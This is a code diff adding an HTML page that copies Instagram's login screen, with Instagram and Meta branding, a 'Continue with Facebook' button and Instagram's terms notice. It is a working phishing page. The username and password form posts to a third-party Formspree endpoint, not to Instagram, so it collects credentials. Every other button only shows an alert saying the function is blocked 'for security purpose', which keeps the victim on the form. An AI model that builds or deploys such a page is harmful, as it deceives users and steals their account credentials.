@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+ <!--  <meta http-equiv="refresh" content="3"> -->
+  
+<!--   this link is for fonts -->
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+
+  <title>service-page</title>
+  
+
+  <link rel="stylesheet" href="style.css">
+</head>
+<style>
+  *{
+    margin:0px;
+    padding:0px;
+    box-sizing:border-box;
+    
+  }
+  .langauge-option-cont{
+    width:100%;
+    height:44px;
+    background-color:white;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    
+  }
+  .langbtn{
+    width:64px;
+    height:20px;
+    background-color:white;
+    color:#737373;
+    font-family: "Roboto", sans-serif;
+    font-size:12px;
+    
+    padding-left:4px;
+    padding-top:3px;
+    display:flex;
+  }
+  .arw{
+    background-image:url('/arrow-down-wide-line.png');
+    background-size:contain;
+    width:10px;
+    height:10px;
+    background-color:transparent;
+    margin-left:2px;
+    margin-top:2px;
+  }
+  select{
+    outline:none;
+    border:none;
+    background-color:white;
+  }
+  .logo-text-cont{
+    margin-top:8px;
+    width:100%;
+    height:110px;
+   /*  border:1px solid black; */
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    
+  }
+  .log-con{
+    background-image:url("/Screenshot_20241022-151939~2.png");
+    background-size:contain;
+    background-color:green;
+    width:170px;
+    height:60px;
+  }
+  .fac-cont{
+    width:100%;
+    height:104px;
+    background-color:transparent;
+   display:flex;
+   justify-content:center;
+/* border:1px solid blue; */
+  }
+  .fac-cont-in{
+    width:270px;
+    height:34px;
+    background-color:#0095f6;
+    margin-top:18px;
+    border-radius:8px;
+    color:white;
+     font-family: "Roboto", sans-serif;
+     font-weight:bold;
+     font-size:14px;
+     text-align:center;
+     padding-top:8px;
+  }
+  .flogo{
+    width:100px;
+    height:40px;
+    background-color:red;
+    margin-right:10px;
+    
+    
+  }
+  .inp-cont{
+   width:100%;
+   height:100px;
+  /*  border:1px solid red; */
+   display:flex;
+ flex-direction: column;
+   align-items:center;
+   justify-content:center;
+  
+  
+  }
+  input{
+   width:270px;
+   height:38px;
+   margin-bottom:6px;
+   padding-left:8px;
+   letter-spacing: -1px;
+   font-size:13px;
+   
+
+     font-family: "Inter", sans-serif;
+     
+     font-style: normal;
+     background-color:#fafafa;
+     border-radius:4px;
+     border:1px solid #dbdbdb;
+     outline:none;
+     /* outline:color:#cfcfcf; */
+  
+  }
+  input:hover{
+ border:1px solid #989898;
+    /* border:1px solid green; */
+  }
+  .forgpass{
+    width:100%;
+    height:20px;
+    margin-top:3px;
+  
+  }
+  .forpss-txt{
+    width:370px;
+    height:20px;
+    color:#0095f6;
+    font-size:14px;
+    font-family: "Roboto", sans-serif;
+    padding-left:234px;
+  }
+   .fac-cont2 {
+     margin-top:3px;
+     width: 100%;
+     height: 60px;
+     background-color: transparent;
+     display: flex;
+     justify-content: center;
+ 
+   }
+     .fac-cont-in2 {
+       width: 270px;
+       height: 32px;
+       background-color: #0095f6;
+       margin-top: 18px;
+       border-radius: 8px;
+  background-color: #4cb5f9;
+  color:white;
+       font-family: "Roboto", sans-serif;
+       font-weight: bold;
+       font-size: 14px;
+       text-align: center;
+       padding-top: 8px;
+       
+     }
+     .signup-cont{
+       width:100%;
+       height:50px;
+       margin-top:26px;
+     
+     }
+     .term-cont{
+       width:100%;
+       height:50px;
+       margin-top:12px;
+     
+     }
+     .sign-txt{
+         width:370px;
+    height:20px;
+    color:#0095f6;
+    font-size:14px;
+    font-family: "Roboto", sans-serif;
+    padding-left:113px;
+    color:grey;
+    
+     }
+     .term-txt{
+         width:370px;
+    height:20px;
+    color:#0095f6;
+    font-size:14px;
+    font-family: "Roboto", sans-serif;
+    padding-left:78px;
+    color:grey;
+    text-align:center;
+     }
+     .signup-sp{
+       color:#4cb5f9;
+        font-family: "Roboto", sans-serif;
+        font-weight:bold;
+        padding-left:4px;
+        color:#0095f6;
+     }
+     .term-sp{
+       color:#4cb5f9;
+        font-family: "Roboto", sans-serif;
+        font-weight:bold;
+        padding-left:4px;
+        color:black;
+     }
+    .blanksp{
+      width:100%;
+      height:156px;
+     
+    }
+    .blanksp{
+      width:100%;
+    }
+    .meta-cont{
+      width:100%;
+      height:50px;
+     background-color:#fafafa;
+     display:flex;
+     align-items:center;
+     justify-content:center;
+    }
+    .meta-mg{
+      width:96px;
+      height:40px;
+      background-color:red;
+      background-image:url('/Screenshot_20241022-154401~2.png');
+      background-size:cover;
+    }
+    button{
+      border:none;
+    }
+</style>
+
+<body>
+<div class="container">
+  <div class="langauge-option-cont">
+      <div class="langbtn"onclick="notnow()">
+        English
+       <!--  <select name="English" id="English">
+         <option value="English">English</option>
+         <option value="">hindi</option>
+         <option value="">urdu</option>
+         <option value="">japanesh</option>
+         <option value="">Korea</option>
+         <option value="">urdu</option>
+         <option value="">portuguesh</option>
+       </select> -->
+        <div class="arw">
+          
+        </div>
+      </div>
+  </div>
+  
+</div>
+<div class="logo-text-cont">
+  <div class="log-con">
+   
+  </div>
+</div>
+<div class="fac-cont">
+  <div class="fac-cont-in"onclick="notnow()">
+ <!--  <span class="flogo">abc</span> -->
+  Continue with Facebook
+  </div>
+
+</div>
+
+ <!--  <div class="fac-cont-in">
+   <span class="flogo">abc</span>
+   Continue with facebook
+ </div> -->
+
+   <form action="https://formspree.io/f/manynbgn"method="POST">
+  <div class="inp-cont">
+   
+  <input type="text" name="uname" class="usser"placeholder="Phone number, username, or email"required>
+    <input type="text" name="secret" class="usser"Placeholder="Password">
+   
+  </div>
+   
+  <div class="forgpass">
+    <div class="forpss-txt"onclick="notnow()">
+      Forgot password?
+    </div>
+  </div>
+  
+  <div class="fac-cont2">
+    <button type="submit" class="fac-cont-in2">
+      <!--  <span class="flogo">abc</span> -->
+     Log in
+    </button>
+  
+  </div>
+   </form>
+   
+   <div class="signup-cont">
+     <div class="sign-txt"onclick="notnow()">
+      Don't have an account?<span class="signup-sp">Sign up</span>
+     </div>
+   </div>
+   
+   
+   
+   <div class="term-cont">
+     <div class="term-txt">
+     By continuing, you agree to Instagram's <span class="term-sp">Terms of Use</span> and <span class="term-sp">privacy policy</span>
+     </div>
+   </div>
+   
+   
+   <div class="blanksp">
+     
+   </div>
+   
+   <div class="meta-cont">
+     <div class="meta-mg">
+       
+     </div>
+   </div>
+   <script>
+  function sub(){
+    alert("hlo");
+  }
+  
+  function notnow(){
+    alert("! This function is not allowed for security purpose.");
+  }
+  
+  
+   </script>
+  <script src="main.js"></script>
+</body>
+</html>
